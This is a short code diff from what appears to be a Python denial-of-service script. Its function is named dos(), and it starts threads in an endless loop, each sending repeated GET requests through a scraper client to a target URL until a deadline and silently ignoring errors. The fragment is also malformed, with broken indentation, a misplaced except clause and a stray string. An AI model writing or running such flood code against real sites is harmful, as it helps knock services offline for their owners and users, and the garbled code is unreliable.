@@ -47,7 +47,12 @@ def dos():
   
 while True:
  threading.Thread(target=dos).start()
-  except:
+  while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False)           
+            
+        except:
             pass
 "response.text"
 # Stats
